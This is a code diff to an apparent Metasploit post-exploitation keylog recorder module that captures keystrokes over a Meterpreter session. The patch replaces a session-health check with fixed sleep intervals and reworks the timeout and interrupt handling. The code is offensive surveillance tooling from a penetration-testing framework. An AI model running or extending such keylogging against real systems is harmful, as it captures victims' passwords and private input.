@@ -73,6 +73,7 @@ class MetasploitModule < Msf::Post
   # @return [void] A useful return value is not expected here
   def setup
     @logfile = nil
+    @timed_out = false
 
     @interval = datastore['INTERVAL'].to_i
     if @interval < 5 || @interval > 30
@@ -248,19 +249,29 @@ class MetasploitModule < Msf::Post
     while rec == 1
       begin
         if session_good?
-          write_keylog_data if good_to_cap?
+          sleep(@interval)
+          print_status("Cap")
+          write_keylog_data
         else
           print_status("Session: #{datastore['SESSION']} is stale or has been closed. Exiting keylog recorder.")
           rec = 0
         end
-      rescue ::Rex::Post::Meterpreter::RequestError => error
-        print_error("Keylog recorder encountered and error. Exiting....")
-        print_error(error.to_s)
+      rescue::Exception => e
+        if e.class.to_s == "Rex::TimeoutError"
+          print_status("Session: #{datastore['SESSION']} is not responding. Exiting keylog recorder.")
+          @timed_out = true
+        elsif e.class.to_s == "Interrupt"
+          print_status("User interrupt. Exiting keylog recorder.")
+          rec = 0
+          return
+        else
+          print_status("Keylog recorder encounted Error: #{e.class} #{e} Exiting...")
+        end
         rec = 0
       end
     end
   end
-  
+
   # This function manages sure a session is still alive acording to the Framework.
   # Also, if the session reaches the timeout age whithout checking in it is
   # assumed to be stale.
@@ -271,42 +282,8 @@ class MetasploitModule < Msf::Post
     return false unless session.alive?
     session_age = Time.now.to_i - session.last_checkin.to_i
     return false if session_age >= @timeout
+    return false if @timed_out
     return true
-  end
-
-  # This function manages the recorder timing along with making sure that the session is still checking in.
-  # It does this by making sure that the age times are not increasing consistently.
-  # It needs three 'good' value in a row to indicate that the session is still good.
-  # At most, this function will run two seconds past the specified value for a good session.
-  # This helps keep the module clean when run as a job.
-  #
-  # @return [TrueClass] Session has been verified to still be active
-  # @return [FalseClass] Session appears to have become inactive
-  def good_to_cap?
-    continue = 1
-    count = 0
-    good_count = 0
-    max = @interval + 3
-
-    prev_age = Time.now.to_i - session.last_checkin.to_i
-
-    while continue == 1
-      count = count + 1
-      sleep(1)
-      current_age = Time.now.to_i - session.last_checkin.to_i
-
-      if current_age < prev_age || current_age < 2
-        good_count = good_count + 1
-      else
-        good_count = 0
-      end
-
-      prev_age = current_age
-
-      return true if count >= @interval && good_count >= 3
-
-      return false if count >= @interval + 3
-    end
   end
 
   # This function writes off the last set of key strokes
@@ -314,11 +291,10 @@ class MetasploitModule < Msf::Post
   #
   # @return [void] A useful return value is not expected here
   def finish_up
-    print_status "Shutting down the keylog recorder. Stand by."
-    if good_to_cap?
-      write_keylog_data
-      session.ui.keyscan_stop rescue nil
-    end
+    print_status("Shutting down the keylog recorder. Stand by.")
+    sleep(@interval)
+    write_keylog_data
+    session.ui.keyscan_stop rescue nil
   end
 
   # This function cleans up the module.
